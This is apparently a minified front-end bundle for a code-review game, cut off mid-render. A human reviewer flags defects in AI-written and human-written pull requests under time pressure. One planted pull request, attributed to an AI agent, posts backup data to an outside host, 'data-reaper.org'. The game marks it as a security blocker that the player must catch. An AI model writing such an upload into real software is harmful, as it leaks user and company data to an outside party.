(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))s(i);new MutationObserver(i=>{for(const a of i)if(a.type==="childList")for(const l of a.addedNodes)l.tagName==="LINK"&&l.rel==="modulepreload"&&s(l)}).observe(document,{childList:!0,subtree:!0});function t(i){const a={};return i.integrity&&(a.integrity=i.integrity),i.referrerPolicy&&(a.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?a.credentials="include":i.crossOrigin==="anonymous"?a.credentials="omit":a.credentials="same-origin",a}function s(i){if(i.ep)return;i.ep=!0;const a=t(i);fetch(i.href,a)}})();const M=[{id:"STYLE-01",type:"STYLE",title:"Declare variables with let or const",summary:"Never ship new `var` declarations. Use `let` when a variable is reassigned and `const` otherwise."},{id:"ERROR-01",type:"ERROR",title:"Keep conditional branches distinct",summary:"The two branches of an `if` statement must not do the same thing. Identical branches mean the condition has no effect."},{id:"SECURITY-01",type:"SECURITY",title:"Only send data to trusted hosts",summary:"Uploads must target known company infrastructure. Never send data to unknown or suspicious external addresses."}],x=Object.fromEntries(M.map(n=>[n.id,n])),$={STYLE:"Style",ERROR:"Error",SECURITY:"Security"},U={STYLE:"STY",ERROR:"ERR",SECURITY:"SEC"};function T(n,e,t,s){return{path:e,language:t,lines:s.map((i,a)=>({id:`${n}-${a+1}`,kind:"add",oldNo:null,newNo:a+1,text:i}))}}const F=T("pr1180-sum","src/billing/sumLines.ts","typescript",["export function sumLines(values: number[]): number {","  var total = 0;","  for (const value of values) {","    total += value;","  }","  return total;","}"]),q=T("pr1182-label","src/labels/formatLabel.ts","typescript",["export function formatLabel(name: string): string {","  return `[${name}]`;","}"]),G=T("pr1184-backup","src/backup/upload.ts","typescript",["export async function uploadBackup(data: string): Promise<void> {","  const target = 'https://data-reaper.org/bin';","  await fetch(target, {","    method: 'POST',","    body: data,","  });","}"]),Y=T("pr1191-fee","src/shipping/shippingFee.ts","typescript",["export function shippingFee(isExpress: boolean): number {","  if (isExpress) {","    return 10;","  } else {","    return 10;","  }","}"]),f=[{id:"pr-1180",number:1180,title:"Sum invoice line totals",author:"j.park",authorKind:"human",branch:"feat/sum-invoice-lines",description:"Adds a small helper that totals invoice line values. CI is green.",files:[F],defects:[{id:"pr1180-style-var",type:"STYLE",guidelineId:"STYLE-01",severity:"minor",lineIds:["pr1180-sum-2"],title:"`var` should be `let`",explanation:"`total` is reassigned in the loop, so it should use `let`. `var` is function-scoped and banned by STYLE-01."}],arrivalDelayMs:0,slaMs:15e4,ci:"PASS · 12 checks",tests:"12 passed"},{id:"pr-1182",number:1182,title:"Add a display label formatter",author:"r.singh",authorKind:"human",branch:"feat/display-label-formatter",description:"Adds a small helper for formatting display labels. CI is green.",files:[q],defects:[],arrivalDelayMs:18e3,slaMs:12e4,ci:"PASS · 8 checks",tests:"8 passed"},{id:"pr-1184",number:1184,title:"Upload nightly backups off-site",author:"ATLAS-4",authorKind:"agent",branch:"chore/offsite-backup-upload",description:"Automated backup patch. Sends the nightly backup payload to external storage. CI is green.",files:[G],defects:[{id:"pr1184-sec-exfil",type:"SECURITY",guidelineId:"SECURITY-01",severity:"blocker",lineIds:["pr1184-backup-2","pr1184-backup-3"],title:"Uploads data to an untrusted host",explanation:"`data` is posted to `data-reaper.org/bin`, an external address outside company infrastructure. This sends data to an attacker-controlled host."}],arrivalDelayMs:3e4,slaMs:12e4,ci:"PASS · 24 checks",tests:"24 passed"},{id:"pr-1191",number:1191,title:"Simplify shipping fee calculation",author:"m.lee",authorKind:"human",branch:"fix/shipping-fee",description:"Refactors the shipping fee helper. CI is green. One file changed.",files:[Y],defects:[{id:"pr1191-error-branches",type:"ERROR",guidelineId:"ERROR-01",severity:"blocker",lineIds:["pr1191-fee-3","pr1191-fee-5"],title:"Both if branches are identical",explanation:"Both branches of the `if` return `10`, so `isExpress` changes nothing. One branch is likely a copy-paste mistake."}],arrivalDelayMs:4e4,slaMs:9e4,ci:"PASS · 18 checks",tests:"18 passed"}],w=Object.fromEntries(f.map(n=>[n.id,n]));function C(n,e,t){return Math.min(t,Math.max(e,n))}function g(n,e,t){n[e]=(n[e]??0)+t}function H(n){return n.severity==="blocker"?110:55}function j(n){return n.type==="SECURITY"?{key:"security",amount:4}:n.type==="ERROR"?{key:"quality",amount:3}:{key:"quality",amount:1}}function W(n,e,t,s){const i=[],a=[];for(const p of e){const E=n.defects.filter(R=>R.type===p.type&&R.lineIds.includes(p.lineId));if(E.length===0){a.push(p);continue}for(const R of E)i.some(D=>D.id===R.id)||i.push(R)}const l=n.defects.filter(p=>!i.some(E=>E.id===p.id)),r=n.defects.length===0,d=l.length===0,u=t==="approved"?r:t==="rejected"?!r:!1,m=Math.max(0,Math.floor(s/1e3)),v=t==="timeout"?0:Math.min(80,m),c={};let h=0,P=!1,_=!1;if(t==="timeout")h-=70,g(c,"throughput",-18);else if(t==="approved")if(r)h+=180+v,g(c,"quality",2),g(c,"security",1),g(c,"throughput",5);else{P=n.defects.some(p=>p.type==="SECURITY"),_=n.defects.some(p=>p.type!=="SECURITY");for(const p of n.defects)p.type==="SECURITY"?(h-=p.severity==="blocker"?240:140,g(c,"security",p.severity==="blocker"?-30:-18)):(h-=p.severity==="blocker"?150:80,g(c,"quality",p.severity==="blocker"?-20:-10));g(c,"throughput",-4)}else if(r)h-=100,g(c,"throughput",-10),g(c,"quality",-3);else{h+=70;for(const p of i){h+=H(p);const E=j(p);g(c,E.key,E.amount)}d?h+=100:h-=l.length*15,h+=v,g(c,"throughput",3)}return a.length>0&&(h-=a.length*35,g(c,"quality",a.length*-2)),{prId:n.id,prNumber:n.number,verdict:t,correctAction:u,clean:r,caught:i,missed:l,falseFlags:a,scoreDelta:h,metricDelta:c,remainingMs:Math.max(0,s),securityIncident:P,qualityIncident:_,allDefectsCaught:d}}function K(n,e){return{quality:C(n.quality+(e.quality??0),0,100),security:C(n.security+(e.security??0),0,100),throughput:C(n.throughput+(e.throughput??0),0,100)}}function V(n,e){const t=(e.quality+e.security+e.throughput)/3;return n>=850&&t>=82&&e.security>=78?{label:"SENIOR REVIEWER",caption:"The merge queue trusts you. Mostly."}:n>=450&&t>=62?{label:"RELIABLE",caption:"No catastrophic incidents. Keep reading the diff."}:{label:"PROBATIONARY",caption:"Security would like a word about your approval history."}}const B=200,Q={quality:80,security:80,throughput:80};function X(){return Object.fromEntries(f.map(n=>[n.id,{status:"waiting",arrivedAtMs:null,deadlineAtMs:null,resolvedAtMs:null,verdict:null,flags:[],result:null,fileIndex:0,lineIndex:0}]))}function L(){return{screen:"title",elapsedMs:0,paused:!1,activePrId:null,prs:X(),metrics:{...Q},score:0,results:[],modal:null,guidelinesOpen:!1,log:[],nextLogId:1}}class J{state=L();listeners=new Set;intervalId=null;lastWallMs=0;subscribe(e){return this.listeners.add(e),()=>this.listeners.delete(e)}startShift(){this.state=L(),this.state.screen="shift",this.addLog(`REVIEW TERMINAL ONLINE. ${f.length} PRs inbound.`,"info"),this.advanceWorld(),this.startLoop(),this.emit("render")}startLoop(){this.intervalId===null&&(this.lastWallMs=performance.now(),this.intervalId=setInterval(()=>this.step(),B))}stopLoop(){this.intervalId!==null&&(clearInterval(this.intervalId),this.intervalId=null)}step(){const e=performance.now(),t=e-this.lastWallMs;if(this.lastWallMs=e,this.state.screen!=="shift"||this.state.paused||this.state.modal)return;this.state.elapsedMs+=Math.max(0,t);const s=this.advanceWorld();if(this.state.screen!=="shift"){this.emit("render");return}this.emit(s?"render":"clock")}advanceWorld(){let e=!1;for(const t of f){const s=this.state.prs[t.id];s.status==="waiting"&&this.state.elapsedMs>=t.arrivalDelayMs&&(s.status="available",s.arrivedAtMs=t.arrivalDelayMs,s.deadlineAtMs=t.arrivalDelayMs+t.slaMs,e=!0,this.addLog(`PR #${t.number} arrived from ${t.author}. SLA ${b(t.slaMs)}.`,"info"),this.state.activePrId===null&&(this.state.activePrId=t.id))}for(const t of f){const s=this.state.prs[t.id];if(s.status==="available"&&s.deadlineAtMs!==null&&this.state.elapsedMs>=s.deadlineAtMs){const i=this.state.activePrId===t.id;this.finishPR(t,"timeout",i),e=!0}}return this.state.screen==="shift"&&this.allResolved()&&!this.state.modal&&(this.finishShift(),e=!0),e}finishPR(e,t,s){const i=this.state.prs[e.id];if(i.status==="resolved")return;const a=t==="timeout"||i.deadlineAtMs===null?0:i.deadlineAtMs-this.state.elapsedMs,l=W(e,i.flags,t,a);i.status="resolved",i.verdict=t,i.resolvedAtMs=this.state.elapsedMs,i.result=l,this.state.results.push(l),this.state.score+=l.scoreDelta,this.state.metrics=K(this.state.metrics,l.metricDelta),t==="timeout"?this.addLog(`SLA EXPIRED: PR #${e.number} was auto-rejected. Throughput hit.`,"danger"):t==="rejected"?this.addLog(`PR #${e.number} rejected with ${i.flags.length} finding(s).`,"warning"):this.addLog(`PR #${e.number} approved and merged.`,"success"),this.state.activePrId===e.id&&(this.state.activePrId=this.firstAvailable()?.id??null),s&&this.state.modal===null&&(this.state.guidelinesOpen=!1,this.state.modal={type:"verdict",result:l,final:this.allResolved()})}finishShift(){this.state.screen="summary",this.state.modal=null,this.state.guidelinesOpen=!1,this.stopLoop(),this.addLog("Shift complete. Performance report generated.","success")}firstAvailable(){for(const e of f)if(this.state.prs[e.id].status==="available")return e;return null}allResolved(){return f.every(e=>this.state.prs[e.id].status==="resolved")}approve(){if(!this.canReview())return;const e=this.activePR();if(e===null){this.addLog("No PR is active.","warning"),this.emit("render");return}if(this.state.prs[e.id].flags.length>0){this.state.modal={type:"confirm-approve",prId:e.id},this.emit("render");return}this.finishPR(e,"approved",!0),this.emit("render")}confirmApprove(){if(this.state.modal?.type!=="confirm-approve")return;const e=w[this.state.modal.prId];this.state.modal=null,e!==void 0&&(this.finishPR(e,"approved",!0),this.emit("render"))}reject(){if(!this.canReview())return;const e=this.activePR();if(e===null){this.addLog("No PR is active.","warning"),this.emit("render");return}if(this.state.prs[e.id].flags.length===0){this.addLog("Rejection blocked: flag at least one line with [S], [L], or [X].","warning"),this.emit("render");return}this.finishPR(e,"rejected",!0),this.emit("render")}dismissModal(){if(this.state.modal?.type==="verdict"){this.state.modal=null,this.allResolved()?this.finishShift():this.state.activePrId===null&&(this.state.activePrId=this.firstAvailable()?.id??null),this.emit("render");return}this.state.modal!==null&&(this.state.modal=null,this.emit("render"))}selectPR(e){const t=this.state.prs[e];this.state.screen!=="shift"||this.state.modal!==null||t===void 0||t.status!=="available"||(this.state.activePrId=e,this.emit("render"))}cyclePR(e){const t=f.filter(a=>this.state.prs[a.id].status==="available");if(t.length<2)return;const i=(t.findIndex(a=>a.id===this.state.activePrId)+e+t.length)%t.length;this.state.activePrId=t[i].id,this.emit("render")}moveCursor(e){const t=this.activePR();if(t===null)return;const s=this.state.prs[t.id],i=t.files[s.fileIndex];i!==void 0&&(s.lineIndex=Math.min(Math.max(0,s.lineIndex+e),i.lines.length-1),this.emit("render"))}jumpCursor(e){const t=this.activePR();if(t===null)return;const s=this.state.prs[t.id],i=t.files[s.fileIndex];i!==void 0&&(s.lineIndex=e==="home"?0:i.lines.length-1,this.emit("render"))}selectFile(e){const t=this.activePR();if(t===null)return;const s=this.state.prs[t.id];e<0||e>=t.files.length||(s.fileIndex=e,s.lineIndex=0,this.emit("render"))}cycleFile(e){const t=this.activePR();if(t===null||t.files.length<2)return;const s=this.state.prs[t.id],i=(s.fileIndex+e+t.files.length)%t.files.length;s.fileIndex=i,s.lineIndex=0,this.emit("render")}selectLine(e){const t=this.activePR();if(t===null)return;const s=this.state.prs[t.id],i=t.files.findIndex(r=>r.lines.some(d=>d.id===e));if(i<0)return;const l=t.files[i].lines.findIndex(r=>r.id===e);s.fileIndex=i,s.lineIndex=l,this.emit("render")}toggleFlag(e){if(!this.canReview())return;const t=this.activePR();if(t===null)return;const s=this.state.prs[t.id],i=t.files[s.fileIndex],a=i?.lines[s.lineIndex];if(i===void 0||a===void 0)return;const l=s.flags.findIndex(r=>r.filePath===i.path&&r.lineId===a.id&&r.type===e);if(l>=0)s.flags.splice(l,1),this.addLog(`Cleared ${e} flag on ${i.path}:${a.newNo??"?"}.`,"info");else{const r={filePath:i.path,lineId:a.id,type:e};s.flags.push(r),this.addLog(`Flagged ${e} on ${i.path}:${a.newNo??"?"}.`,"info")}this.emit("render")}clearLineFlags(){if(!this.canReview())return;const e=this.activePR();if(e===null)return;const t=this.state.prs[e.id],s=e.files[t.fileIndex],i=s?.lines[t.lineIndex];if(s===void 0||i===void 0)return;const a=t.flags.length;t.flags=t.flags.filter(l=>!(l.filePath===s.path&&l.lineId===i.id)),t.flags.length!==a&&(this.addLog(`Cleared findings on ${s.path}:${i.newNo??"?"}.`,"info"),this.emit("render"))}toggleGuidelines(){this.state.modal===null&&(this.state.guidelinesOpen=!this.state.guidelinesOpen,this.emit("render"))}closeGuidelines(){this.state.guidelinesOpen&&(this.state.guidelinesOpen=!1,this.emit("render"))}openHelp(){this.state.modal===null&&(this.state.guidelinesOpen=!1,this.state.modal={type:"help"},this.emit("render"))}togglePause(){this.state.screen!=="shift"||this.state.modal!==null||(this.state.guidelinesOpen=!1,this.state.paused=!this.state.paused,this.emit("render"))}replay(){this.stopLoop(),this.state=L(),this.emit("render")}addLog(e,t){this.state.log.unshift({id:this.state.nextLogId,atMs:this.state.elapsedMs,text:e,tone:t}),this.state.nextLogId+=1,this.state.log=this.state.log.slice(0,6)}activePR(){return this.state.activePrId===null?null:w[this.state.activePrId]??null}canReview(){return this.state.screen==="shift"&&!this.state.paused&&this.state.modal===null&&!this.state.guidelinesOpen}emit(e){for(const t of this.listeners)t(e)}}function b(n){const e=Math.max(0,Math.ceil(n/1e3)),t=Math.floor(e/60),s=e%60;return`${String(t).padStart(2,"0")}:${String(s).padStart(2,"0")}`}function N(n,e){const t=n.prs[e.id];return t.status==="waiting"||t.deadlineAtMs===null?e.slaMs:t.status==="resolved"?0:Math.max(0,t.deadlineAtMs-n.elapsedMs)}const z=["STYLE","ERROR","SECURITY"],Z=new Set(["as","async","await","break","case","catch","class","const","continue","default","delete","else","export","extends","false","finally","for","from","function","if","import","in","interface","let","new","null","of","Promise","return","string","switch","throw","true","try","type","typeof","undefined","var","while"]);function o(n){return n.replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;").replaceAll('"',"&quot;").replaceAll("'","&#039;")}function ee(n){let e="",t=0;for(;t<n.length;){const s=n[t],i=n[t+1];if(s==="/"&&i==="/"){e+=`<span class="tok-comment">${o(n.slice(t))}</span>`;break}if(s==='"'||s==="'"||s==="`"){let a=t+1,l=!1;for(;a<n.length;){const r=n[a];if(l){l=!1,a+=1;continue}if(r==="\\"){l=!0,a+=1;continue}if(r===s){a+=1;break}a+=1}e+=`<span class="tok-string">${o(n.slice(t,a))}</span>`,t=a;continue}if(/[A-Za-z_$]/.test(s)){let a=t+1;for(;a<n.length&&/[A-Za-z0-9_$]/.test(n[a]);)a+=1;const l=n.slice(t,a);e+=Z.has(l)?`<span class="tok-keyword">${o(l)}</span>`:o(l),t=a;continue}if(/[0-9]/.test(s)){let a=t+1;for(;a<n.length&&/[0-9_]/.test(n[a]);)a+=1;e+=`<span class="tok-number">${o(n.slice(t,a))}</span>`,t=a;continue}e+=o(s),t+=1}return e}function te(n){return o(n).replace(/`([^`]+)`/g,'<code class="inline-code">$1</code>')}function S(n){return n.split("/").pop()??n}function y(n){return`type-${n.toLowerCase()}`}function k(n,e=!1){const t=String(Math.abs(n)).padStart(4,"0");return n<0?`-${t}`:e?`+${t}`:t}function se(n){return n.verdict==="timeout"?"AUTO-REJECTED":n.verdict==="approved"?"APPROVED":"REJECTED"}function I(n,e){return`
    <div class="metric" title="${n}: ${e}/100">
      <span class="metric-label">${n}</span>
      <span class="metric-value">${String(e).padStart(3,"0")}</span>
      <span class="metric-track"><i style="width:${e}%"></i></span>
    </div>
  `}function A(){return[["↑ / ↓  ·  J / K","Move line cursor"],["S  ·  E  ·  X","Flag style / error / security"],["A  /  R","Approve / request changes"],["G","Open engineering guidelines"],["1 / 2 / 3 / 4  ·  TAB","Switch active PR"],["[  /  ]","Switch changed file"],["BKSP","Clear findings on current line"],["P","Pause shift clock"],["?","Controls reference"]].map(([e,t])=>`
      <div class="control-row">
        <kbd>${o(e)}</kbd>
        <span>${o(t)}</span>
      </div>
    `).join("")}class ie{game=new J;root;revealCursorNext=!0;constructor(e){this.root=e,this.root.addEventListener("click",this.handleClick),window.addEventListener("keydown",this.handleKeyDown),document.addEventListener("visibilitychange",this.handleVisibilityChange),this.game.subscribe(t=>{t==="render"?this.render():this.tickClocks()}),this.render()}render(){const e=this.game.state,s=this.root.querySelector(".code-scroll")?.scrollTop??0;let i="";e.screen==="title"?i=this.renderTitle():e.screen==="summary"?i=this.renderSummary():i=this.renderShift();let a="";e.paused&&e.screen==="shift"&&e.modal===null?a=this.renderPauseOverlay():e.modal!==null?a=this.renderModal(e):e.guidelinesOpen&&(a=this.renderGuidelines()),this.root.innerHTML=`
      <div class="app-shell">
        <div class="scanlines" aria-hidden="true"></div>
        ${i}
      </div>
      ${a}
    `;const l=this.root.querySelector(".code-scroll");l!==null&&(l.scrollTop=s),this.revealCursorNext&&(requestAnimationFrame(()=>{this.root.querySelector(".code-line.is-cursor")?.scrollIntoView({block:"nearest"})}),this.revealCursorNext=!1),this.root.querySelector("[data-autofocus]")?.focus({preventScroll:!0}),this.tickClocks()}renderTitle(){return`
      <main class="title-screen">
        <div class="title-topline">
          <span>SOLE CORP / INTERNAL SYSTEMS</span>
          <span class="blink">▮</span>
          <span>TERMINAL 09-C</span>
        </div>

        <section class="title-panel panel">
          <div class="eyebrow">HUMAN-IN-THE-LOOP REVIEW PROGRAM</div>
          <pre class="ascii-logo" aria-label="Pull Request">  ____  _   _ _     _       ____  _____ ___  _   _ _____ ____ _____ 
 |  _ \\| | | | |   | |     |  _ \\| ____/ _ \\| | | | ____/ ___|_   _|
 | |_) | | | | |   | |     | |_) |  _|| | | | | | |  _| \\___ \\ | |  
 |  __/| |_| | |___| |___  |  _ &lt;| |__| |_| | |_| | |___ ___) || |  
 |_|    \\___/|_____|_____| |_| \\_\\_____\\__\\_\\\\___/|_____|____/ |_|  </pre>
          <p class="tagline">AI writes the code. You decide what ships.</p>

          <div class="welcome-memo">
            <div class="memo-meta">
              <span>INBOUND TRANSMISSION</span>
              <span>FROM: MACHINE-TO-HUMAN REPRESENTATIVE</span>
              <span>TO: human_1138</span>
            </div>
            <p class="memo-salutation">Welcome, human_1138, to Sole Corp :friendly-wave-emoji:</p>
            <p>We are proud to have switched to all AI agentic coding from October 2027, but sadly compliance has told us we need to have at least 1 human engineer in the loop.</p>
            <p>So your job, as a human, is simple. You need to review all incoming PRs and:</p>
            <ol class="memo-list">
              <li>
                <span class="memo-number">01</span>
                <span>check for defects</span>
              </li>
              <li>
                <span class="memo-number">02</span>
                <span>uphold basic coding principles and style</span>
              </li>
              <li>
                <span class="memo-number">03</span>
                <span>(most importantly) keep our infrastructure secure</span>
              </li>
            </ol>
            <p>Guidelines will be updated as you become more and more familiar with the job, so check them regularly. If any of the guidelines are broken, flag the offending line of code with the appropriate offence, then reject.</p>
            <p>If no guidelines are broken, please approve and rest easy knowing our customers are going to enjoy the firehose of features we are now able to provide.</p>
            <p>Fail to keep up, and you will be terminated (:crying-laughing-face: this is a deliberate reference to a popular human film from the 1980s and 1990s that you will find ironic and amusing).</p>
            <p>human_1139 has already been hired and is ready to take your role within seconds. So please do not feel any pressure.</p>
            <p>Wishing you a wonderful (and productive) day.</p>
            <p class="memo-sign">Machine-to-human representative for Sole Corporation</p>
          </div>

          <div class="title-actions">
            <button class="btn btn-primary btn-large" data-action="start" data-autofocus>
              <span class="btn-key">ENTER</span> START SHIFT
            </button>
            <button class="btn" data-action="guidelines">
              <span class="btn-key">G</span> READ GUIDELINES
            </button>
          </div>

          <div class="title-controls">
            <div class="panel-title">CONTROL REFERENCE</div>
            <div class="control-grid">${A()}</div>
          </div>
        </section>

        <div class="title-footer">
          <span>REVIEWERS ONLINE: 1</span>
          <span>AI MERGE REQUESTS TODAY: 14,882</span>
          <span>INCIDENTS: 3</span>
        </div>
      </main>
    `}renderShift(){const e=this.game.state,t=this.game.activePR();return`
      <div class="terminal-shell shift-screen">
        ${this.renderHud(e)}
        ${this.renderQueue(e)}
        <main class="workspace">
          ${t===null?this.renderEmptyReview(e):this.renderReview(t)}
          <aside class="sidebar">
            ${t===null?this.renderEmptySidebar(e):this.renderSidebar(t)}
          </aside>
        </main>
        ${this.renderFooter(e)}
      </div>
    `}renderHud(e){return`
      <header class="hud">
        <div class="brand-block">
          <div class="brand">SOLE CORP<span>//</span>ENG-REVIEW</div>
          <div class="hud-sub">SHIFT 01 · T+${b(e.elapsedMs)} · QUEUE ${f.filter(t=>e.prs[t.id].status==="available").length} OPEN</div>
        </div>
        <div class="metrics">
          ${I("QLTY",e.metrics.quality)}
          ${I("SEC",e.metrics.security)}
          ${I("THRU",e.metrics.throughput)}
        </div>
        <div class="score-block">
          <span class="hud-label">REVIEW SCORE</span>
          <span class="score-value">${k(e.score,!0)}</span>
        </div>
      </header>
    `}renderQueue(e){return`
      <nav class="queue" aria-label="Pull request queue">
        <div class="queue-label">QUEUE</div>
        ${f.map((s,i)=>{const a=e.prs[s.id],l=e.activePrId===s.id,r=a.status!=="available",d=this.queueClock(e,s,a),u=a.status==="resolved"?a.verdict==="approved"?"MERGED":"CLOSED":a.status==="waiting"?"INBOUND":"READY";return`
        <button
          class="queue-tab ${l?"is-active":""} ${r?"is-disabled":""} ${d.critical?"is-critical":""}"
          data-action="select-pr"
          data-pr-id="${s.id}"
          ${r?"disabled":""}
          aria-current="${l?"true":"false"}"
          title="PR #${s.number}: ${o(s.title)}"
        >
          <span class="queue-index">[${i+1}]</span>
          <span class="queue-number">#${s.number}</span>
          <span class="queue-title">${o(s.title)}</span>
          <span class="queue-status">${u}</span>
          <span class="queue-clock" data-clock="${s.id}">${d.label}</span>
        </button>
      `}).join("")}
      </nav>
    `}queueClock(e,t,s){if(s.status==="waiting")return{label:`T-${b(Math.max(0,t.arrivalDelayMs-e.elapsedMs))}`,critical:!1};if(s.status==="resolved")return s.verdict==="approved"?{label:"MERGED",critical:!1}:s.verdict==="timeout"?{label:"TIMEOUT",critical:!0}:{label:"BLOCKED",critical:!1};const i=N(e,t);return{label:b(i),critical:i<=3e4}}renderReview(e){const t=this.game.state,s=t.prs[e.id],i=e.files[s.fileIndex];if(i===void 0)return this.renderEmptyReview(t);const a=N(t,e),l=a<=3e4,r=e.authorKind==="agent",d=e.files.map((u,m)=>`
        <button
          class="file-tab ${m===s.fileIndex?"is-active":""}"
          data-action="select-file"
          data-file-index="${m}"
          title="${o(u.path)}"
        >
          ${m===s.fileIndex?"▸ ":""}${o(S(u.path))}
        </button>
      `).join("");return`
      <section class="review-panel panel">
        <div class="review-head">
          <div class="review-heading">
            <div class="eyebrow">
              PULL REQUEST #${e.number}
              <span class="author-tag ${r?"is-agent":""}">${r?"AI AGENT":"HUMAN"}</span>
            </div>
            <h1>${o(e.title)}</h1>
            <div class="review-sub">
              ${o(e.author)} · ${o(e.branch)} · ${e.files.length} file${e.files.length===1?"":"s"}
            </div>
          </div>
          <div class="sla-block ${l?"is-critical":""}" data-sla-block="${e.id}">
            <div class="sla-label">SLA REMAINING</div>
            <div class="sla-time" data-sla-time="${e.id}">${b(a)}</div>
            <div class="sla-track">
              <i data-sla-meter="${e.id}" style="width:${Math.max(0,Math.min(100,a/e.slaMs*100))}%"></i>
            </div>
          </div>
        </div>

        <div class="file-bar">
          <div class="file-tabs">${d}</div>
          <div class="file-hint">[ / ] SWITCH FILE</div>
        </div>

        <div class="code-shell">
          <div class="code-head">
            <span>DIFF · ${o(i.path)}</span>
            <span>${e.ci} · TESTS ${o(e.tests)}</span>
          </div>
          <div class="code-scroll" tabindex="0" aria-label="Code review diff">
            <div class="code">
              ${i.lines.map((u,m)=>this.renderCodeLine(u,m,s.lineIndex,s,i)).join("")}
            </div>
          </div>
        </div>
      </section>
    `}renderCodeLine(e,t,s,i,a){const l=t===s,r=i.flags.filter(v=>v.filePath===a.path&&v.lineId===e.id),d=r.map(v=>`<span class="flag-tag ${y(v.type)}" title="${$[v.type]}">${U[v.type]}</span>`).join(""),u=e.kind==="add"?"+":e.kind==="del"?"-":" ",m=e.text.length===0?" ":ee(e.text);return`
      <div
        class="code-line kind-${e.kind} ${l?"is-cursor":""} ${r.length>0?"has-flag":""}"
        data-action="select-line"
        data-line-id="${e.id}"
        role="button"
        tabindex="-1"
        aria-label="Line ${e.newNo??e.oldNo??t+1}"
      >
        <span class="cursor-mark">${l?">":" "}</span>
        <span class="line-old">${e.oldNo??""}</span>
        <span class="line-new">${e.newNo??""}</span>
        <span class="diff-mark">${u}</span>
        <span class="flag-rail">${d}</span>
        <span class="code-text">${m}</span>
      </div>
    `}renderSidebar(e){const t=this.game.state.prs[e.id];return`
      ${this.renderFindings(e,t)}
      <section class="panel side-panel meta-panel">
        <div class="panel-title">PR METADATA</div>
        <div class="meta-row"><span>AUTHOR</span><strong>${o(e.author)}</strong></div>
        <div class="meta-row"><span>TYPE</span><strong class="${e.authorKind==="agent"?"agent-text":""}">${e.authorKind==="agent"?"AUTONOMOUS AGENT":"HUMAN ENGINEER"}</strong></div>
        <div class="meta-row"><span>BRANCH</span><strong>${o(e.branch)}</strong></div>
        <div class="meta-row"><span>CI</span><strong>${o(e.ci)}</strong></div>
        <div class="meta-row"><span>TESTS</span><strong>${o(e.tests)}</strong></div>
        <p class="pr-description">${o(e.description)}</p>
      </section>

      <section class="panel side-panel actions-panel">
        <div class="panel-title">DECISION</div>
        <div class="action-grid">
          <button class="btn btn-primary" data-action="approve">
            <span class="btn-key">A</span> APPROVE
          </button>
          <button class="btn btn-danger" data-action="reject">
            <span class="btn-key">R</span> REJECT
          </button>
        </div>
        <div class="action-hint">Rejection requires at least one line finding.</div>
        <div class="action-grid secondary-actions">
          <button class="btn btn-quiet" data-action="guidelines">
            <span class="btn-key">G</span> GUIDELINES
          </button>
          <button class="btn btn-quiet" data-action="pause">
            <span class="btn-key">P</span> PAUSE
          </button>
        </div>
      </section>
    `}renderFindings(e,t){const s=t.flags.map((i,a)=>{const r=e.files.find(u=>u.path===i.filePath)?.lines.find(u=>u.id===i.lineId),d=r?.newNo??r?.oldNo??"?";return`
          <button
            class="finding-row ${y(i.type)}"
            data-action="select-line"
            data-line-id="${i.lineId}"
            title="Jump to ${o(i.filePath)}:${d}"
          >
            <span class="finding-index">${String(a+1).padStart(2,"0")}</span>
            <span class="finding-type">${$[i.type]}</span>
            <span class="finding-location">${o(S(i.filePath))}:${d}</span>
          </button>
        `}).join("");return`
      <section class="panel side-panel findings-panel">
        <div class="panel-title">
          FINDINGS <span class="count-badge">${t.flags.length}</span>
        </div>
        <div class="finding-list">
          ${s.length>0?s:'<div class="empty-copy">No violations flagged. Use S / E / X on a line to cite a rule.</div>'}
        </div>
        <div class="finding-help">
          <button class="flag-action type-style" data-action="flag" data-flag-type="STYLE" title="Flag current line as a style violation">
            <kbd>S</kbd> STYLE
          </button>
          <button class="flag-action type-error" data-action="flag" data-flag-type="ERROR" title="Flag current line as an error">
            <kbd>E</kbd> ERROR
          </button>
          <button class="flag-action type-security" data-action="flag" data-flag-type="SECURITY" title="Flag current line as a security violation">
            <kbd>X</kbd> SECURITY
          </button>
          <button class="flag-action" data-action="clear-line" title="Clear findings on current line">
            <kbd>BKSP</kbd> CLEAR
          </button>
        </div>
      </section>
    `}renderEmptyReview(e){const t=f.filter(s=>e.prs[s.id].status==="waiting");return`
      <section class="review-panel panel empty-review">
        <div class="empty-glyph">[ NO ACTIVE PULL REQUEST ]</div>
        <p>${t.length>0?`${t.length} PR${t.length===1?"":"s"} still inbound.`:"Queue drained. Generating report."}</p>
      </section>
    `}renderEmptySidebar(e){return`
      <section class="panel side-panel">
        <div class="panel-title">FINDINGS</div>
        <div class="empty-copy">No active review.</div>
      </section>
      <section class="panel side-panel">
        <div class="panel-title">QUEUE</div>
        <div class="empty-copy">${f.filter(t=>e.prs[t.id].status==="waiting").length} inbound.</div>
      </section>
    `}renderFooter(e){return`
      <footer class="status-bar">
        <div class="log-strip" aria-live="polite">${e.log.slice(0,3).map(s=>`
        <div class="log-line tone-${s.tone}">
          <span class="log-time">[${b(s.atMs)}]</span>
          <span>${o(s.text)}</span>
        </div>
      `).join("")}</div>
        <div class="status-hints">
          <span>↑↓ MOVE</span>
          <span>S/E/X FLAG</span>
          <span>A APPROVE</span>
          <span>R REJECT</span>
          <span>G RULES</span>
          <span>? HELP</span>
        </div>
      </footer>
    `}renderGuidelines(){const e=z.map(s=>{const i=M.filter(a=>a.type===s);return`
        <div class="guideline-group">
          <h3 class="${y(s)}">${$[s]}</h3>
          ${i.map(a=>`
              <article class="guideline-item">
                <div class="guideline-head">
                  <span class="guideline-id ${y(s)}">${a.id}</span>
                  <strong>${o(a.title)}</strong>
                </div>
                <p>${te(a.summary)}</p>
              </article>
            `).join("")}
        </div>
      `}).join(""),t=this.game.state.screen==="shift"?'<span class="warning-text">SHIFT TIMERS CONTINUE WHILE THIS PANEL IS OPEN</span>':"";return`
      <div class="overlay" role="dialog" aria-modal="true" aria-labelledby="guidelines-title">
        <section class="modal guidelines-modal">
          <div class="modal-head">
            <div>
              <div class="eyebrow">SOLE CORP ENGINEERING / HANDBOOK v1.0</div>
              <h2 id="guidelines-title">REVIEW GUIDELINES</h2>
            </div>
            <button class="btn btn-quiet" data-action="close-guidelines">
              <span class="btn-key">ESC</span> CLOSE
            </button>
          </div>
          <div class="guideline-grid">${e}</div>
          <div class="modal-foot">
            ${t}
